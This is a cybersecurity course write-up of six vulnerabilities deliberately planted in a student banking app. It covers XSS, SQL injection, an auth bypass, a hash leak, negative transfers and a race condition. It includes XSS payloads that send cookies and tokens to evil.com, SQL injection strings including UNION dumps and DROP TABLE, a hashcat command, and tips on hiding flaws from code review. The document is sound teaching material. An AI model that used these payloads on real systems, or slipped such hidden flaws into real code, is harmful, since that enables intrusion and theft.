# DOCUMENT 2 - Detailed Documentation of 6 Inserted Vulnerabilities

**Course:** Cybersecurity
**Project:** FlexiBank (BankApplication backend + frontend-bank-app frontend)

---

## Vulnerability 1 - Stored Cross-Site Scripting (XSS)

| Field | Value |
|---|---|
| **Category** | XSS (Stored / Persistent) |
| **Severity** | Critical |
| **Affected component** | Frontend (Next.js / React) |

**Files modified:**
1. `frontend-bank-app/app/dashboard/transactions/page.tsx` - Line 61
2. `frontend-bank-app/app/dashboard/page.tsx` - Line 117

### Original Code

In both files, transaction descriptions were rendered using standard React JSX interpolation, which automatically HTML-escapes all output:

`transactions/page.tsx`, line 61:
```jsx
<p className="font-medium">
  {transaction.description?.trim() || "Transfer between accounts"}
</p>
```

`dashboard/page.tsx`, line 117:
```jsx
<p className="font-medium">
  {transaction.description?.trim() || "Transfer between accounts"}
</p>
```

### Modified Code

Both instances were changed to render description as raw HTML using React's `dangerouslySetInnerHTML` prop:

`transactions/page.tsx`, line 61:
```jsx
<p className="font-medium"
   dangerouslySetInnerHTML={{
     __html: transaction.description?.trim() || "Transfer between accounts"
   }} />
```

`dashboard/page.tsx`, line 117:
```jsx
<p className="font-medium"
   dangerouslySetInnerHTML={{
     __html: transaction.description?.trim() || "Transfer between accounts"
   }} />
```

### Why This Change Looks Innocent

`dangerouslySetInnerHTML` is a legitimate React API. It exists because there are valid use cases for injecting raw HTML: rendering sanitized markdown output, displaying content from a trusted CMS, or embedding pre-rendered HTML from a server-side template. In a code review, this change might appear as if the developer wanted to allow rich formatting in transfer descriptions (e.g., `<b>Rent payment</b>`). The prop name itself contains "dangerous" as a warning by design, but developers who encounter it frequently in codebases that use it legitimately (e.g., Next.js `getStaticProps` returning HTML) tend to normalize it. The rest of the JSX structure remains identical - it's a single attribute addition on an existing `<p>` element, easily overlooked in a diff.

### How It Works - Technical Explanation

React's Virtual DOM reconciliation treats JSX interpolation (`{variable}`) as a text node. Before inserting it into the real DOM, React calls the equivalent of `document.createTextNode(value)`, which ensures all HTML special characters (`<`, `>`, `&`, `"`, `'`) are treated as literal text, not markup. This is React's built-in XSS protection - it makes it impossible for user-supplied strings to be interpreted as HTML or JavaScript.

The `dangerouslySetInnerHTML` prop bypasses this entirely. Under the hood, React calls `element.innerHTML = value.__html` on the real DOM node, which tells the browser's HTML parser to interpret the string as HTML markup. Any valid HTML in the string - including `<script>` tags, event handler attributes (`onerror`, `onload`, `onmouseover`), `<iframe>` elements, or `<a href="javascript:...">` links - is parsed and executed by the browser.

The vulnerability is **stored (persistent)** because the attack payload is written to the database via the transfer description field. The flow is:

1. Attacker submits a `POST /bank/transfer/{userId}` with a malicious `description` field.
2. The backend's `TransferService.transferFunds()` saves the description as-is into the `transfers` table (no sanitization, no encoding, no validation - see pre-existing B.4).
3. When any user loads the Dashboard (`/dashboard`) or Transactions (`/dashboard/transactions`) page, the frontend fetches transfers via `GET /bank/transfers/{userId}` and renders each description with `dangerouslySetInnerHTML`.
4. The browser parses the HTML in the description and executes any embedded scripts.

This is more dangerous than reflected XSS because the payload persists indefinitely, affects all users who view the transaction (not just the one who clicked a link), and executes without any user interaction beyond navigating to a normal page.

### Exploitation Scenario

1. Attacker logs in and goes to the Transfer page.
2. Attacker creates a transfer with the following description:
   ```html
   <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
   ```
3. The backend saves this string as-is into the transfers table (the `description` column is a plain VARCHAR with no sanitization).
4. When the victim logs in and views their Dashboard or Transactions page, the browser attempts to load an image from `src="x"`, which fails. The `onerror` handler fires, executing the JavaScript `fetch()` call that sends the victim's cookies to the attacker's server.
5. More importantly for this app: since auth is via localStorage (pre-existing B.2), the attacker would use:
   ```html
   <img src=x onerror="new Image().src='https://evil.com/?d='+encodeURIComponent(localStorage.getItem('user'))">
   ```
   This exfiltrates the `{id, email, name}` object, giving the attacker the victim's userId - which is all they need to access all API endpoints on the victim's behalf (pre-existing B.3).

More advanced payloads:
- `<script>document.location='https://evil.com/phish'</script>` - redirect the victim to a phishing page that mimics the bank login.
- A self-propagating payload that creates a new transfer with the same malicious description from the victim's account, spreading the XSS to additional users (XSS worm pattern).

### Security Impact

- **Complete account takeover:** The attacker obtains the victim's userId from localStorage, which grants full access to all API endpoints (read accounts, initiate transfers, delete accounts, view cards including CVV).
- **Data exfiltration:** All data visible in the browser (account balances, card numbers, CVVs, full transaction history) can be extracted via JavaScript and sent to an external server.
- **No CSP defense:** The application sets no `Content-Security-Policy` header, so inline scripts and external resource loads execute without restriction.
- **Blast radius:** Every user who views the Transactions or Dashboard page is affected. If the attacker sends transfers to multiple users, the malicious description appears in all their transaction lists.

---

## Vulnerability 2 - SQL Injection

| Field | Value |
|---|---|
| **Category** | SQL Injection |
| **Severity** | Critical |
| **Affected component** | Backend (Spring Boot / Java) |

**Files modified:**
1. `BankApplication/src/main/java/com/bankapplication/management/service/BankAccountService.java` - Lines 80-85
2. `BankApplication/src/main/java/com/bankapplication/management/controllers/BankAccountController.java` - Lines 76-81

### Original Code

The BankAccountService had no search functionality. All database queries used Spring Data JPA repository methods (`findByOwner_Id`, `findById`, etc.), which use parameterized queries internally and are immune to SQL injection.

The BankAccountController had no `/search` endpoint.

### Modified Code

`BankAccountService.java` - new method added at lines 80-85:

```java
@SuppressWarnings("unchecked")
public List<Accounts> searchAccountsByName(String accountName) {
    String query = "SELECT * FROM accounts WHERE account_name LIKE '%"
                   + accountName + "%'";
    return entityManager.createNativeQuery(query, Accounts.class)
                        .getResultList();
}
```

A new field was also added:

```java
@PersistenceContext
private EntityManager entityManager;
```

`BankAccountController.java` - new endpoint at lines 76-81:

```java
@GetMapping("search")
@Operation(summary = "Search accounts by name",
           description = "Find bank accounts matching the given account name")
public ResponseEntity<?> searchAccounts(@RequestParam String name) {
    return ResponseEntity.ok(bankAccountService.searchAccountsByName(name));
}
```

### Why This Change Looks Innocent

Adding a search/filter endpoint is one of the most common feature requests in any CRUD application. The method uses JPA's `EntityManager` (a core JPA API that every Spring Data JPA developer knows), and the controller follows the exact same pattern as every other endpoint in the project: `@GetMapping`, `@Operation` for Swagger docs, `ResponseEntity.ok(...)` wrapping the service call. The `@SuppressWarnings("unchecked")` annotation is commonly seen with native queries because `createNativeQuery().getResultList()` returns a raw `List` without generics. Crucially, every other database operation in the project uses Spring Data JPA repository interfaces (`JpaRepository` method names like `findByOwner_Id`, `findById`), which internally generate parameterized JPQL queries. A reviewer seeing this new method might assume the `EntityManager` approach also uses parameterized queries, especially since the JPA API *does* support them (`query.setParameter()`). The vulnerable pattern is only visible if you read the string concatenation inside the query construction.

### How It Works - Technical Explanation

Spring Data JPA repository methods (e.g., `findByOwner_Id(Long userId)`) are safe from SQL injection because Spring generates parameterized JPQL queries at runtime. The query becomes `SELECT a FROM Accounts a WHERE a.owner.id = ?1`, and the parameter value is bound separately from the query structure. The JDBC driver sends the query and parameters to PostgreSQL as distinct protocol messages, making it structurally impossible for user input to alter the query's syntax.

The inserted `searchAccountsByName` method uses a completely different approach: `EntityManager.createNativeQuery(String sql, Class resultClass)`. This API accepts a raw SQL string and sends it to the database as-is. The method constructs this string by concatenating user input directly:

```java
String query = "SELECT * FROM accounts WHERE account_name LIKE '%" + accountName + "%'";
```

This is the textbook SQL injection pattern. The user input is embedded inside a SQL string literal (within single quotes). If the input contains a single quote character (`'`), it terminates the string literal, and everything after it is interpreted as SQL syntax. The LIKE clause becomes the injection point.

The safe alternative would be to use a parameterized native query:
```java
String query = "SELECT * FROM accounts WHERE account_name LIKE :name";
entityManager.createNativeQuery(query, Accounts.class).setParameter("name", "%" + accountName + "%");
```
But the vulnerable version skips `setParameter()` entirely and inlines the value.

### Exploitation Scenario

**1. Data exfiltration - dump all accounts:**

```
GET /bank/search?name=' OR 1=1 --
```

The concatenated SQL becomes:
```sql
SELECT * FROM accounts WHERE account_name LIKE '%' OR 1=1 --%'
```
The `'` closes the LIKE string literal. `OR 1=1` makes the WHERE clause universally true. `--` is a SQL comment that neutralizes the trailing `%'`. Result: every account in the database is returned, regardless of owner, name, or any other filter.

**2. UNION-based extraction of user credentials:**

```
GET /bank/search?name=' UNION SELECT user_id, email, password, full_name, email, 0 FROM users --
```

The UNION appends a second result set to the query. The attacker must match the column count and types of the `accounts` table (6 columns: `id`, `account_name`, `account_number`, `currency`, `user_id`, `balance`). By substituting `users` table columns into matching positions, the attacker can extract `email` and `password` (BCrypt hash) from the users table. The response is returned as JSON, so the hashes are directly readable.

**3. Destructive attack:**

```
GET /bank/search?name='; DROP TABLE accounts; --
```
Whether this succeeds depends on whether the PostgreSQL JDBC driver allows multiple statements in a single query (by default, `allowMultiQueries` is false in PostgreSQL's JDBC driver, but some configurations enable it). Even if stacked queries are blocked, the attacker can still use `UPDATE` or `DELETE` within a subquery in some database configurations.

**4. Blind SQL injection (if error messages are suppressed):**

Even if the application caught exceptions and returned generic errors, the attacker could use time-based blind injection:
```
GET /bank/search?name=' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)::text='1
```
If the response takes 5 seconds, the condition was true. This allows one-bit-at-a-time data extraction.

### Security Impact

- **Full database read access:** The attacker can extract the contents of any table, including `users` (emails, BCrypt hashes), `accounts` (balances, account numbers), `cards` (card numbers, CVVs, expiry dates), and `transfers` (full transaction history).
- **Potential data modification or destruction** if stacked queries or writable subqueries are supported by the driver configuration.
- **Bypasses all application-level access controls** since the SQL executes with the application's database user privileges, which typically has full read/write access to all tables.
- **No authentication required:** Since all endpoints are `permitAll()` (pre-existing B.3), this endpoint is accessible to anyone who can reach the server on the network. No login is needed to exploit it.

---

## Vulnerability 3 - Auth: Empty Password Bypass

| Field | Value |
|---|---|
| **Category** | Authentication |
| **Severity** | Critical |
| **Affected component** | Backend (Spring Boot / Java) |

**File modified:**
`BankApplication/src/main/java/com/bankapplication/management/service/UserService.java` - Line 37

### Original Code

```java
public UserResponse login(LoginRequest request) {
    Users user = UserRepository.findByEmail(request.getEmail());
    if (user == null
        || !passwordEncoder.matches(request.getPassword(), user.getPassword()))
    {
        throw new IllegalArgumentException("Invalid email or password");
    }
    ...
}
```

The condition was: throw if user is null OR password doesn't match.

### Modified Code

```java
public UserResponse login(LoginRequest request) {
    Users user = UserRepository.findByEmail(request.getEmail());
    if (user == null
        || !passwordEncoder.matches(request.getPassword(), user.getPassword())
        && request.getPassword().length() > 0)
    {
        throw new IllegalArgumentException("Invalid email or password");
    }
    ...
}
```

The added clause: `&& request.getPassword().length() > 0`

### Why This Change Looks Innocent

It appears to be a defensive check: "also verify the password is non-empty." In a code review, a developer might read it as "reject if user is null, OR if password doesn't match AND password isn't empty" - which sounds like it adds protection. The subtle operator precedence issue is easy to miss, especially without explicit parentheses.

### How It Works - Technical Explanation

Java's operator precedence: `&&` (logical AND) binds tighter than `||` (logical OR).

The original condition:
```
if (user == null || !passwordEncoder.matches(pwd, hash))
```

The modified condition WITHOUT explicit parentheses:
```
if (user == null || !passwordEncoder.matches(pwd, hash) && pwd.length() > 0)
```

Java evaluates this as:
```
if (user == null || (!passwordEncoder.matches(pwd, hash) && pwd.length() > 0))
```

When password is an empty string `""`:
- `passwordEncoder.matches("", hash)` returns `false`
- `!false` = `true`
- `"".length() > 0` = `false`
- `true && false` = `false`
- `user == null || false` = `false` (assuming user exists)
- The if-block is NOT entered - **login succeeds!**

The empty-string password bypasses the BCrypt check entirely because the `&&` short-circuits the entire password validation branch to `false`.

### Exploitation Scenario

1. Attacker knows (or guesses) a victim's email address.
2. Attacker sends:
   ```json
   POST /api/auth/login
   {"email": "victim@example.com", "password": ""}
   ```
3. The server finds the user, evaluates the condition as described above, skips the exception, and returns the full UserResponse with user ID.
4. Attacker now has the victim's user ID and can access all their data via the unprotected API endpoints.

### Security Impact

- **Complete authentication bypass** for any account whose email is known.
- No rate limiting exists, so email enumeration is trivial (register endpoint reveals "Email already in use").
- Combined with the open endpoints (pre-existing B.3), the attacker gains full control of the victim's banking data.

---

## Vulnerability 4 - Auth: Password Hash Leak via JSON Serialization

| Field | Value |
|---|---|
| **Category** | Authentication / Information Disclosure |
| **Severity** | High |
| **Affected component** | Backend (Spring Boot / Java) |

**File modified:**
`BankApplication/src/main/java/com/bankapplication/management/entity/Accounts.java` - Line 24

### Original Code

```java
import com.fasterxml.jackson.annotation.JsonBackReference;
...

@ManyToOne
@JoinColumn(name = "user_id", nullable = false)
@JsonBackReference // Jackson wont serialize owner field again
private Users owner;
```

`@JsonBackReference` completely prevents Jackson from serializing the `owner` field. API responses for accounts contained no owner information.

### Modified Code

```java
import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
...

@ManyToOne
@JoinColumn(name = "user_id", nullable = false)
@JsonIgnoreProperties({"accounts"})
private Users owner;
```

`@JsonIgnoreProperties({"accounts"})` only prevents the accounts list within the owner from being serialized (to avoid infinite recursion). All other fields of the Users entity - including `password` - ARE serialized.

### Why This Change Looks Innocent

This looks like a deliberate improvement: the developer wanted to include the account owner's name/email in account responses (useful for display) while preventing infinite recursion between `Users.accounts` -> `Accounts.owner` -> `Users.accounts`. Using `@JsonIgnoreProperties` for cycle-breaking is a well-documented Jackson pattern and appears in many Stack Overflow answers. The fact that `Users.password` has no `@JsonIgnore` annotation is the real underlying issue - but that's in a different file, making it hard to connect during review.

### How It Works - Technical Explanation

When Jackson serializes an Accounts entity:
- **Original:** `@JsonBackReference` - owner field is skipped entirely
- **Modified:** `@JsonIgnoreProperties({"accounts"})` - owner IS serialized, but `owner.accounts` is skipped (cycle-breaking)

The Users entity has these fields: `id`, `fullName`, `email`, `password`, `accounts`. With the annotation change, the serialized owner includes ALL fields except `accounts`. The `password` field (BCrypt hash) is exposed in every API response that returns account data.

### Exploitation Scenario

1. Attacker calls:
   ```
   GET /bank/accounts/1
   ```
2. Response now includes:
   ```json
   [
     {
       "id": 1,
       "accountName": "Savings",
       "accountNumber": "RO...",
       "currency": "EUR",
       "balance": 5000.0,
       "owner": {
         "id": 1,
         "fullName": "Emilia Cristea",
         "email": "emilia@example.com",
         "password": "$2a$10$xK3v9..."
       }
     }
   ]
   ```
3. Attacker extracts the BCrypt hash and runs offline brute-force:
   ```
   hashcat -m 3200 -a 0 hash.txt rockyou.txt
   ```
4. If the password is weak or common, the hash is cracked in minutes.

This data is also exposed via:
- `GET /bank/search?name=...` (the new search endpoint)
- `GET /bank/transfers/{userId}` (via `senderAccount.owner`)

### Security Impact

- **BCrypt password hashes** of all users are exposed in plain API responses.
- **Offline brute-force attacks** become possible without any interaction with the server (no rate limiting can help once the hash is obtained).
- User email addresses are also exposed, enabling targeted phishing.
- Affects every API endpoint that returns Accounts entities.

---

## Vulnerability 5 - Code Error: Negative Transfer Amount

| Field | Value |
|---|---|
| **Category** | Errors in application code / Business logic flaw |
| **Severity** | High |
| **Affected component** | Frontend (Next.js / React) |

**File modified:**
`frontend-bank-app/app/dashboard/transfer/page.tsx` - Lines 130-136, 150

### Original Code

Amount input (line ~130):
```jsx
<Input
    id="amount"
    type="number"
    placeholder="0.00"
    value={amount}
    onChange={(e) => setAmount(e.target.value)}
    step="0.01"
    min="0"
/>
```

Submit button (line ~150):
```jsx
<Button
    onClick={handleTransfer}
    disabled={!fromAccount || !toAccount || !amount
              || Number.parseFloat(amount) <= 0}
    className="w-full"
    size="lg"
>
```

Two protections existed:
1. HTML `min="0"` attribute on the input (prevents typing negatives natively)
2. `Number.parseFloat(amount) <= 0` in the disabled condition

### Modified Code

Amount input:
```jsx
<Input
    id="amount"
    type="number"
    placeholder="0.00"
    value={amount}
    onChange={(e) => setAmount(e.target.value)}
    step="0.01"
/>
```

Submit button:
```jsx
<Button
    onClick={handleTransfer}
    disabled={!fromAccount || !toAccount || !amount}
    className="w-full"
    size="lg"
>
```

Both protections removed:
1. `min="0"` attribute removed from the input
2. `Number.parseFloat(amount) <= 0` check removed from disabled condition

### Why This Change Looks Innocent

Removing `min="0"` and simplifying the disabled condition looks like a UI cleanup - fewer validation rules on the frontend, shorter code. A developer might argue "the backend handles validation" (it doesn't). The disabled condition still checks that all fields are filled, which seems sufficient at a glance.

### How It Works - Technical Explanation

The backend's `TransferService.transferFunds()` only checks:
```java
if (senderAccount.getBalance() < amount)
    throw InsufficientFundsException(...)
```

When amount is negative (e.g., -500):
- `balance < -500` is always false (any positive balance > -500)
- The check passes
- `senderAccount.balance = balance - (-500) = balance + 500` (INCREASES)
- `recipientAccount.balance = balance + (-500) = balance - 500` (DECREASES)

The transfer logic inverts: the sender gains money and the recipient loses it.

### Exploitation Scenario

1. Attacker has Account A with balance 100 EUR.
2. Victim has Account B with balance 5000 EUR.
3. Attacker initiates a transfer:
   - From: Account A
   - To: Account B's account number
   - Amount: -4000
4. Result:
   - Account A: `100 - (-4000) = 4100 EUR` (attacker gained 4000)
   - Account B: `5000 + (-4000) = 1000 EUR` (victim lost 4000)
5. The transfers table records amount=-4000, which looks anomalous but the app has no alerts or monitoring.

### Security Impact

- **Direct theft of funds:** attacker can drain any account they know the number of by sending a negative-amount "transfer."
- No server-side validation exists to catch this - the vulnerability persists even if the frontend were fixed, since the API can be called directly.
- The backend stores the transaction, creating a record of the theft that could be used for forensic analysis, but there is no real-time detection.

---

## Vulnerability 6 - Code Error: Race Condition (Missing @Transactional)

| Field | Value |
|---|---|
| **Category** | Errors in application code / Concurrency flaw |
| **Severity** | High |
| **Affected component** | Backend (Spring Boot / Java) |

**File modified:**
`BankApplication/src/main/java/com/bankapplication/management/service/TransferService.java` - Line 48

### Original Code

```java
import jakarta.transaction.Transactional;
...

@Transactional
public void transferFunds(Long senderAccountId,
                          String recipientAccountNumber,
                          Double amount,
                          String description,
                          LocalDateTime date) {
    ...
}
```

The `@Transactional` annotation ensured the entire transfer operation executed within a single database transaction. The import for `jakarta.transaction.Transactional` was present.

### Modified Code

```java
// import removed: jakarta.transaction.Transactional
...

public void transferFunds(Long senderAccountId,
                          String recipientAccountNumber,
                          Double amount,
                          String description,
                          LocalDateTime date) {
    ...
}
```

The `@Transactional` annotation and its import were removed.

### Why This Change Looks Innocent

Removing `@Transactional` is nearly invisible - it's a single annotation deletion, and the method compiles and works identically for single requests. The import removal is similarly easy to miss. Without the annotation, each JPA `repository.save()` call creates its own micro-transaction, so the method still appears to work correctly in testing. The bug only manifests under concurrent load, which is rarely tested in development.

### How It Works - Technical Explanation

Without `@Transactional`, each database operation runs in its own transaction:

```
Thread 1 (Transfer A->B, 500)     Thread 2 (Transfer A->B, 500)
------------------------------    ------------------------------
READ A.balance = 1000             READ A.balance = 1000
CHECK 1000 >= 500 OK              CHECK 1000 >= 500 OK
SET A.balance = 500               SET A.balance = 500
SAVE A                            SAVE A (overwrites to 500)
READ B.balance = 0                READ B.balance = 0
SET B.balance = 500               SET B.balance = 500
SAVE B                            SAVE B (overwrites to 500)
```

Result: A paid 500 twice (1000 total), but `A.balance = 500` (only 500 deducted). B received 500 (not 1000). Money was created from nothing: A lost 500, B gained 500, but 1000 was supposed to move. The invariant (total money in system is constant) is violated.

With `@Transactional`, the database would lock the rows and the second transaction would either wait or see the updated balance, preventing the double-spend.

### Exploitation Scenario

1. Attacker has Account A with 1000 EUR.
2. Attacker sends 10 concurrent requests, each transferring 1000 EUR from Account A to Account B (an account they also control):
   ```bash
   for i in {1..10}; do
     curl -X POST http://localhost:8080/bank/transfer/1 \
       -H "Content-Type: application/json" \
       -d '{"senderAccountId":1,"recipientAccountNumber":"RO...","amount":1000}' &
   done
   ```
3. Due to the race condition, multiple requests pass the balance check before any of them commit the deduction.
4. Account A's balance ends up at 0 (or close), but Account B's balance increases by several thousand EUR (multiple successful credits).
5. Net result: money is created out of thin air.

### Security Impact

- **Allows unlimited money creation** through concurrent transfer exploitation.
- Violates the fundamental accounting invariant of a banking system.
- Difficult to detect without transaction-level auditing (the individual transfer records each look valid).
- Exploitable by any user against their own accounts - no elevated privileges needed.

---

## Summary Table

| # | Category | Vulnerability | File(s) Modified |
|---|----------|--------------|-----------------|
| 1 | XSS | Stored XSS via `dangerouslySetInnerHTML` | `transactions/page.tsx` (L61), `dashboard/page.tsx` (L117) |
| 2 | SQL Injection | Native query string concatenation | `BankAccountService.java` (L80-85), `BankAccountController.java` (L76-81) |
| 3 | Auth | Empty password bypass (operator precedence) | `UserService.java` (L37) |
| 4 | Auth | Password hash leak via `@JsonIgnoreProperties` | `Accounts.java` (L24) |
| 5 | Code Error | Negative transfer amount allowed | `transfer/page.tsx` (L130-136, L150) |
| 6 | Code Error | Race condition (missing `@Transactional`) | `TransferService.java` (L48) |
